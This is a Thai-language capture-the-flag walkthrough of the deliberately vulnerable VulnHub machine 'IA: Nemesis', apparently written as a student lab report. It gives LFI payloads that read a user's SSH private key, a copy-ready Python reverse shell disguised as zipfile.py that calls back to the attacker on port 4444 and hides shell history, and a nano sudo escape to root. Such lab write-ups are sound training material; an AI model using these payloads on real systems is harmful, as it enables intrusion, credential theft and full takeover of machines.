# รายงานสรุปแลป IA : Nemesis (1.0.1)


## 1. บทนำ

แลป IA : Nemesis เป็นแบบฝึกหัดในรูปแบบ CTF (Capture The Flag) สำหรับฝึกการทดสอบเจาะระบบ โดยใช้ Kali Linux เป็นเครื่องโจมตี และเครื่องเป้าหมายเป็น VM Debian ที่มีช่องโหว่หลายจุด

เอกสารฉบับนี้จะเน้นอธิบาย **ขั้นตอน + คำสั่งที่ใช้จริง** ในแต่ละช่วงของการโจมตี เช่น

- การสำรวจเครือข่ายด้วย `ip` และ `nmap`
- การโจมตีเว็บแอปด้วย Local File Inclusion (LFI)
- การขโมย SSH key และเข้าเครื่องด้วย `ssh`
- การยกระดับสิทธิ์ด้วย Python library hijacking (ไฟล์ `zipfile.py`) และ reverse shell
- การใช้ `su`, `sudo` และเทคนิคจาก GTFOBins (nano) เพื่อได้สิทธิ์ `root`

---

## 2. วัตถุประสงค์

1. เข้าใจการใช้งานคำสั่งพื้นฐานบน Kali Linux สำหรับสำรวจเครือข่ายและระบบเป้าหมาย
2. ฝึกใช้คำสั่ง `nmap`, `ssh`, `su`, `sudo`, `nc`, `find`, `cat`, `nano` ฯลฯ ในบริบทของการโจมตีจริง
3. เรียนรู้เทคนิค Local File Inclusion (LFI), การใช้ SSH key และ privilege escalation
4. สามารถอ่านและวิเคราะห์ผลลัพธ์ของคำสั่งต่าง ๆ เพื่อนำมาตัดสินใจในขั้นตอนถัดไป

---

## 3. สภาพแวดล้อมและการตั้งค่าเบื้องต้น

- Host: Windows 11 + Oracle VirtualBox  
- Guest 1 (Attacker): Kali Linux  
- Guest 2 (Victim): IA : Nemesis (Debian 64-bit) ดาวน์โหลดจาก VulnHub  
- Network: NAT Network ชื่อ `LAB_NEMESIS` วง `88.88.88.0/24` และเปิด DHCP
  <img width="825" height="554" alt="image" src="https://github.com/user-attachments/assets/03f9f1bf-1592-489f-ac20-3748fb8e9ec9" />
  <img width="825" height="644" alt="image" src="https://github.com/user-attachments/assets/1fc073e2-e135-4b2b-9b8d-fd6207dbdd79" />



> **หมายเหตุ:** IP จริงของ Kali/Nemesis ในเครื่องเราอาจต่างจากตัวอย่าง ให้ดูจาก `ip a` และ `nmap` ของตัวเอง

---

## 4. ขั้นตอนการทดลองและคำสั่งที่ใช้

### 4.1 ตรวจสอบ IP และสแกนเครือข่าย

#### บน Kali – ดู IP ของตัวเอง

```bash
ip a
```

- ใช้แสดง interface เครือข่ายและ IP address ทั้งหมด
- ตรวจสอบว่าเครื่อง Kali ได้อยู่ในวง `88.88.88.0/24` ตามที่ตั้งค่า NAT Network ไว้

#### บน Kali – สแกนหา host ในวงแลป

```bash
nmap -sn 88.88.88.0/24
```

- `-sn` = ping scan / host discovery
- ใช้ค้นหา IP ของ Nemesis (ดูจาก IP ใหม่ที่ไม่ได้เป็นของ Kali/Default Gateway)
<img width="825" height="580" alt="image" src="https://github.com/user-attachments/assets/d5ee9d61-77ef-4bae-a716-9375edd22b1d" />

#### บน Kali – สแกนพอร์ตของ Nemesis

สมมติว่าเจอ Nemesis อยู่ที่ `88.88.88.5`:


```bash
nmap -sS -sV -A 88.88.88.5
```

- `-sS` ใช้ TCP SYN scan (half-open) เพื่อสแกนพอร์ตเปิดอย่างรวดเร็วและค่อนข้าง stealthy
- `-sV` ตรวจเวอร์ชัน service เช่น Apache, OpenSSH
- `-A` ทำ OS detection, script scanning, traceroute
- ผลลัพธ์ที่สนใจ:
  - พอร์ต HTTP เช่น `80/tcp`, `52845/tcp`
  - พอร์ต SSH เช่น `22/tcp`
<img width="825" height="428" alt="image" src="https://github.com/user-attachments/assets/1b1b353b-29c4-4110-86f5-c53936c5e5f5" />

---

### 4.2 ใช้ช่องโหว่ LFI อ่านไฟล์สำคัญ

ขั้นนี้ทำผ่านเว็บเบราว์เซอร์ (แต่ payload พิมพ์แบบนี้)

#### ทดสอบ LFI ด้วย `/etc/passwd`

ในหน้าเว็บ `http://88.88.88.5:52845` → ไปที่หน้า Contact / ฟอร์มข้อความ แล้วในช่อง Message ใส่:

```text
../../../etc/passwd
```
<img width="825" height="514" alt="image" src="https://github.com/user-attachments/assets/e52cb57b-c2ef-4cba-9cdc-cdfe2b0d8efb" />


- ถ้าระบบนำ path ตรง ๆ ไปอ่านไฟล์จากเครื่องเซิร์ฟเวอร์ แล้วโชว์ผลบนหน้าเว็บ
- เราจะเห็นเนื้อหาไฟล์ `/etc/passwd` (รายชื่อ user บนเครื่อง Nemesis)

จาก `/etc/passwd` จะพบ user สำคัญ เช่น:

```text
carlos:x:1001:1001::/home/carlos:/bin/bash
thanos:x:1002:1002::/home/thanos:/bin/bash
```
<img width="825" height="364" alt="image" src="https://github.com/user-attachments/assets/822772fb-89e8-415d-b854-61a0a43a2719" />


#### ใช้ LFI อ่าน SSH Private Key ของ `thanos`

เปลี่ยน payload ในช่องข้อความเป็น:

```text
../../../../home/thanos/.ssh/id_rsa
```
<img width="825" height="475" alt="image" src="https://github.com/user-attachments/assets/22495d0b-c9db-4e25-8d6d-fd703d63cda4" />


ถ้าเว็บไม่ป้องกัน จะได้เนื้อหา SSH private key เช่น:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```
<img width="825" height="441" alt="image" src="https://github.com/user-attachments/assets/62792177-1f83-4285-b7ea-0b8790bad7b9" />


ให้ copy ทั้งบล็อกเก็บไว้ (ใช้ DevTools ช่วยก็ได้)
<img width="825" height="514" alt="image" src="https://github.com/user-attachments/assets/ff9eb8ba-2842-4343-970f-6cd79705edc9" /> 

---

### 4.3 ใช้ SSH Key เข้าระบบเป็น `thanos` และหา Flag1

#### บน Kali – สร้างไฟล์ key และตั้งสิทธิ์

```bash
cd ~
nano id_rsa
```
<img width="825" height="408" alt="image" src="https://github.com/user-attachments/assets/12c32813-2c72-4973-9252-caa2e0079cf0" />


วางเนื้อหา key ที่ copy มาจากเว็บ (ตั้งแต่ `-----BEGIN` ถึง `-----END`) → save ออกมาจาก nano แล้วตั้ง permission:

```bash
chmod 600 id_rsa
```

เหตุผล: SSH จะไม่ยอมใช้ key ถ้า permission เปิดกว้างเกินไป

#### บน Kali – SSH เข้า Nemesis เป็น `thanos`

ถ้าใช้พอร์ต SSH ปกติ:

```bash
ssh -i id_rsa thanos@88.88.88.5
```
ถ้าโจทย์ใช้พอร์ตอื่น (เช่น 52846):

```bash
ssh -i id_rsa thanos@88.88.88.5 -p 52846
```
<img width="825" height="366" alt="image" src="https://github.com/user-attachments/assets/98d1805f-a787-4ead-8aee-1c60e65c7613" />

ถ้าสำเร็จ prompt จะเป็น:

```bash
thanos@nemesis:~$
```

#### บน Nemesis – หา Flag1

```bash
ls
cat flag1.txt
cat backup.py
```

- `ls` ดูไฟล์ในโฮมของ `thanos` (มักจะมี `backup.py` และ `flag1.txt`)
- `cat flag1.txt` → อ่าน Flag1
- `cat backup.py` → ดูสคริปต์ที่เกี่ยวข้องกับการ backup (ใช้โมดูล `zipfile`)
  <img width="825" height="459" alt="image" src="https://github.com/user-attachments/assets/8e1f4d39-d5c4-41d7-81e4-0204dd2ad6ac" />


---

### 4.4 Python Library Hijacking เพื่อได้ shell ของ `carlos`

ไอเดีย: มีสคริปต์ `backup.py` ที่ทำงานด้วยสิทธิ์อื่น และ import `zipfile`  
เราสร้างไฟล์ `zipfile.py` ของเราเอง (ในโฟลเดอร์ที่ Python เห็น) เพื่อแทนที่โมดูลมาตรฐาน แล้วฝัง reverse shell ไว้

#### 4.4.1 โค้ด reverse shell (`zipfile.py`) – ตัว copy ได้

> แก้ `lhost` เป็น IP ของ Kali ของเราเอง  
> แก้ `lport` ถ้าต้องการใช้ port อื่น (ค่าตัวอย่างใช้ 4444)

บน Nemesis (ขณะเป็น `thanos`):

```bash
cd /home/thanos
nano zipfile.py
```

ใส่โค้ดด้านล่างนี้ครบ ๆ:

```python
import socket
import os
import pty

lhost = "88.88.88.3"  # IP ของ Kali
lport = 4444          # พอร์ตที่ Kali จะรอฟัง (nc)

class ZipFile(object):
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

os.unsetenv("HISTFILE")
pty.spawn("/bin/bash")
```

save แล้วออกจาก nano

<img width="825" height="380" alt="image" src="https://github.com/user-attachments/assets/e6dc827a-4508-4cc6-9fe7-449fa4cea991" />


#### 4.4.2 ตรวจว่ามี zipfile.py อยู่ที่ไหนบ้าง (ออปชัน)

```bash
find / -name zipfile.py 2>/dev/null
```

จะเห็นไฟล์ เช่น:

```text
/home/thanos/zipfile.py
/usr/lib/python2.7/zipfile.py
/usr/lib/python3.7/zipfile.py
```

แสดงว่าไฟล์ของเราน่าจะถูก import ได้เมื่อ backup รัน

#### 4.4.3 ตั้ง listener บน Kali เพื่อรอ reverse shell

บน Kali:

```bash
nc -nvlp 4444
```

- `-n` ไม่ resolve DNS
- `-v` verbose
- `-l` listen mode
- `-p 4444` ระบุ port

เมื่อ cron/backup script ทำงาน (เรียก `backup.py` ที่ import zipfile) → โค้ดใน `zipfile.py` ของเราจะถูกรัน และ shell จะวิ่งกลับมาที่ Kali

<img width="825" height="414" alt="image" src="https://github.com/user-attachments/assets/0f7501c9-12f6-4b4d-a283-f7b87fa651d6" />

เช่น ผลลัพธ์ที่เห็นบน Kali:

```text
connect to [88.88.88.3] from (UNKNOWN) [88.88.88.5] 40770
carlos@nemesis:~$
```

<img width="825" height="415" alt="image" src="https://github.com/user-attachments/assets/9577c58c-7836-4fc7-8b89-9da382b786dc" />

ตอนนี้เราได้ shell เป็น `carlos`

#### 4.4.4 หา Flag2 และดูสคริปต์เข้ารหัส

บน shell ที่เป็น `carlos`:

```bash
ls -la
cat flag2.txt
cat encrypt.py
```
<img width="825" height="479" alt="image" src="https://github.com/user-attachments/assets/dcfa439b-fc63-4010-bfa2-c681bb28c3c4" />

- `ls -la` → เห็นไฟล์ เช่น `flag2.txt`, `encrypt.py`, อื่น ๆ
- `cat flag2.txt` → อ่าน Flag2
- `cat encrypt.py` → ดูโค้ดที่ใช้ **Affine cipher** และ ciphertext (เช่น `FAJ5RWQXLAXDQZAWNDVLSU`)

<img width="825" height="506" alt="image" src="https://github.com/user-attachments/assets/54e4e3a5-47a0-408c-ab4c-f4a317b8b992" />

นำ ciphertext ไปถอดบนเว็บ:

- https://www.dcode.fr/affine-cipher

โหมด brute force → จะได้ข้อความ:

```text
ENCRYPTIONISFUNPASSWORD
```
<img width="825" height="584" alt="image" src="https://github.com/user-attachments/assets/d4fbf9f1-f747-441e-af96-2e517b5dd9dd" />

ข้อความนี้คือ **password ของ user `carlos`** ที่ใช้กับ `su carlos`

---

### 4.5 ใช้ `su`, `sudo` และ `nano` เพื่อยกระดับสิทธิ์เป็น `root`

เป้าหมายสุดท้ายคือได้ root shell และอ่าน `root.txt`

#### 4.5.1 เปลี่ยนเป็น `carlos` แบบมาตรฐาน (กรณีเริ่มจาก shell `thanos`)

ถ้าเราอยู่ใน shell ของ `thanos` (ผ่าน SSH):

```bash
su carlos
```

พิมพ์รหัสผ่าน:

```text
ENCRYPTIONISFUNPASSWORD
```

เช็ค user ปัจจุบัน:

```bash
whoami
```

ควรได้:

```text
carlos
```

#### 4.5.2 ตรวจสอบสิทธิ์ sudo

```bash
sudo -l
```

ดูผลลัพธ์ เช่น:

```text
User carlos may run the following commands on nemesis:
    (root) NOPASSWD: /bin/nano /opt/priv
```

แปลว่า `carlos` สามารถรัน `nano /opt/priv` ในสิทธิ์ root ได้

<img width="825" height="506" alt="image" src="https://github.com/user-attachments/assets/effaba81-c67f-40ac-9080-d773d9029e23" />

#### 4.5.3 เปิด nano ในสิทธิ์ root

```bash
sudo /bin/nano /opt/priv
```

ตอนนี้เราอยู่ในโปรแกรม `nano` ที่รันด้วยสิทธิ์ root

#### 4.5.4 ใช้ GTFOBins (nano) เพื่อดึง root shell

เทคนิคจาก https://gtfobins.github.io/ (nano):

1. ในหน้าจอ nano กด:

   - `Ctrl+R`
   - `Ctrl+X`

2. ด้านล่างจะมี prompt ให้ใส่ command → พิมพ์บรรทัดนี้:

   ```text
   reset; sh 1>&0 2>&0
   ```

3. กด Enter

หลังจากนั้นเราจะหลุดออกมาที่ shell ใหม่ ซึ่งยังอยู่ในเทอร์มินัลเดิม แต่สิทธิ์กลายเป็น root

ทดสอบ:

```bash
whoami
```

ควรได้:

```text
root
```

#### 4.5.5 อ่าน root flag

```bash
cd /root
ls
cat root.txt
```

- `cd /root` → เข้าบ้านของผู้ใช้ `root`
- `ls` → เจอ `root.txt`
- `cat root.txt` → อ่าน root flag และข้อความสรุปจากผู้สร้าง CTF

---

<img width="825" height="518" alt="image" src="https://github.com/user-attachments/assets/a4b5f462-26b8-4bd3-a4a8-eabfb84e3591" />

## 5. ตารางสรุปคำสั่งสำคัญ

| คำสั่ง | ใช้ในขั้นตอน | คำอธิบายสั้น ๆ |
|--------|---------------|-----------------|
| `ip a` | สำรวจเครือข่าย | ดู interface และ IP address ของ Kali |
| `nmap -sn 88.88.88.0/24` | สแกนเครือข่าย | ค้นหา host ที่ออนไลน์ในวง 88.88.88.0/24 |
| `nmap -sS -sV -A 88.88.88.5` | สแกนพอร์ต | หาพอร์ตเปิด + เวอร์ชันบริการ + ข้อมูล OS ของ Nemesis |
| payload `../../../etc/passwd` | ทดสอบ LFI | ตรวจว่าเว็บสามารถอ่านไฟล์ระบบผ่าน input ของผู้ใช้ได้หรือไม่ |
| payload `../../../../home/thanos/.ssh/id_rsa` | ขโมย SSH key | ใช้ LFI อ่าน SSH private key ของผู้ใช้ thanos |
| `nano id_rsa` | เตรียม SSH key | สร้างไฟล์ key ใน Kali และวางเนื้อหา private key ลงไป |
| `chmod 600 id_rsa` | ตั้งสิทธิ์ key | กำหนด permission ถูกต้อง เพื่อให้ SSH ยอมใช้ key นี้ |
| `ssh -i id_rsa thanos@88.88.88.5 [-p PORT]` | เข้าเครื่องเป้าหมาย | เชื่อมต่อเป็นผู้ใช้ thanos โดยใช้ SSH key |
| `ls`, `ls -la` | สำรวจไฟล์ | ดูไฟล์ในโฟลเดอร์ปัจจุบัน รวมถึงไฟล์ซ่อน |
| `cat flag1.txt`, `cat flag2.txt`, `cat root.txt` | อ่าน flag | เปิดดูเนื้อหาไฟล์ flag แต่ละระดับ |
| `nano zipfile.py` | เตรียม hijack | สร้างไฟล์โมดูล zipfile ปลอมที่ฝัง reverse shell |
| `find / -name zipfile.py 2>/dev/null` | ตรวจโมดูล | ดูว่ามี zipfile.py อยู่ไหนบ้างในระบบ |
| `nc -nvlp 4444` | รับ reverse shell | เปิด netcat รอฟังการเชื่อมต่อจาก Nemesis |
| `su carlos` | เปลี่ยนผู้ใช้ | เปลี่ยนจาก user เดิมไปเป็น carlos โดยใช้ password |
| `sudo -l` | ตรวจสิทธิ์ | ดูว่าผู้ใช้ปัจจุบันมีสิทธิ์ sudo ทำอะไรได้บ้าง |
| `sudo /bin/nano /opt/priv` | เริ่ม privilege escalation | เปิด nano ด้วยสิทธิ์ root ตาม sudoers |
| `reset; sh 1>&0 2>&0` | GTFOBins (nano) | ใช้ใน nano เพื่อเปิด root shell แล้วดึง I/O กลับมาที่เทอร์มินัล |
| `whoami` | ตรวจ user | เช็คว่าตอนนี้เรากำลังเป็น user ไหน (เช่น root หรือไม่) |
| `cd /root` | เข้าโฟลเดอร์ root | เข้าไปยังโฟลเดอร์บ้านของ root เพื่อหา root flag |

---

## 6. สรุปผลแลป

จากแลป IA : Nemesis เห็นได้ว่า:

- ช่องโหว่เล็ก ๆ อย่าง **LFI** ถ้ารวมกับการตั้งค่าสิทธิ์ไฟล์ที่ไม่ดี (เช่น SSH key อ่านได้จากเว็บ) สามารถนำไปสู่การยึดเครื่องได้จริง
- การใช้สคริปต์ backup ที่ import โมดูลแบบไม่ระวัง ทำให้เกิด **Python library hijacking** และเปิดทางให้ reverse shell
- การกำหนด `sudoers` แบบให้รัน editor (เช่น `nano`) ในสิทธิ์ root โดยไม่ล็อกสภาพแวดล้อม ทำให้ใช้เทคนิคจาก **GTFOBins** หลุดออกมาเป็น root shell ได้ง่าย

ทักษะสำคัญที่ได้จากแลปนี้:

- อ่านผล `nmap` แล้วคิดต่อว่าจะโจมตีส่วนไหน
- ออกแบบ payload สำหรับ LFI
- ใช้เครื่องมือมาตรฐาน (`ssh`, `nc`, `su`, `sudo`, `nano`) ในมุมมองของผู้โจมตี
- เข้าใจว่าการตั้งค่าระบบผิดแค่เล็กน้อยหลาย ๆ จุดรวมกัน สามารถพาไปสู่การโดนยึด root ได้ทั้งเครื่อง

> ใช้ README นี้เป็น both: คู่มือเล่นแลป + โครงเขียนรายงานส่งอาจารย์ได้เลย  
> ถ้าจะทำเวอร์ชันสั้นเอาไว้พรีเซนต์ในสไลด์ ให้ดึงเฉพาะหัวข้อหลักและคำสั่งเด่น ๆ ไปใช้
